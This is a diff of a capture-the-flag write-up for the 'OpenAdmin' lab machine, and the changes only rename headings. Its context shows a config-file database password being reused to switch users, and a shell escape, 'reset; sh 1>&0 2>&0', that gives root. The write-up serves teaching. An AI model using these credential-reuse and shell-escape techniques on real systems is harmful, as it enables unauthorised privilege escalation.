@@ -306,12 +306,15 @@ $ona_contexts=array (
 ?>
 ```
 
+# Privilege Escalation to jimmy
+
 And we are lucky to get credentials for the mysql database.
 
 ```console
 User: ona_sys
 Password: n1nj4W4rri0R!
 ```
+
 
 Let's see if the password got reused by any of the known accounts.
 
@@ -320,6 +323,8 @@ www-data@openadmin:/var/www/html/ona/local/config$ su - jimmy
 Password: 
 jimmy@openadmin:~$
 ```
+
+# Privilege Escalation to joanna
 
 Bingo! Now that we are successfully escalated to jimmy, let's check out the
 internal directory.
@@ -464,7 +469,7 @@ Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
 Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
 ```
 
-# user.txt
+## user.txt
 
 ```console
 joanna@openadmin:~$ cat user.txt
@@ -522,7 +527,7 @@ Command to execute: reset; sh 1>&0 2>&0#
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-# root.txt
+## root.txt
 
 All what we have to do is to grab the root flag and that's it!
 
